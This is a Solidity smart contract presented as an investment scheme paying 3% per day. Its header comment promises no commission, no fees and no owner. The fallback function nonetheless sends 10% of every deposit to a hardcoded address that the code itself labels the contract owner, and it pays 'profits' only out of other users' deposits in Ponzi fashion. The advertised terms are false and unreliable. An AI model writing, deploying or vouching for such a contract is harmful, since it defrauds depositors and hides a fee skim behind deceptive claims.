pragma solidity ^0.4.24;

/**
 *
 * Three Ether Free Contract
 *  - GAIN 3% PER 24 HOURS (every 5900 blocks)
 *  - NO COMMISSION on your investment (every ether stays on contract&#39;s balance)
 *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
 *  - Marketing Campain
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 */
contract ThreeEtherFree {
    address marketing;
    
    function ThreeEtherFree() {
        // Contract owner address
        marketing = 0x02490cbea9524a21a03eae01d3decb5eca4f7672;
    }
    
    mapping (address => uint256) balances;
    mapping (address => uint256) timestamp;

    function() external payable {
        // Marketing campain
        uint256 getmsgvalue = msg.value / 10;
        marketing.transfer(getmsgvalue);
        
        // Payout
        if (balances[msg.sender] != 0)
        {
            address sender = msg.sender;
            uint256 getvalue = balances[msg.sender]*3/100*(block.number-timestamp[msg.sender])/5900;
            sender.transfer(getvalue);
        }

        // Update user info
        timestamp[msg.sender] = block.number;
        // Reinvest
        balances[msg.sender] += msg.value;

    }
}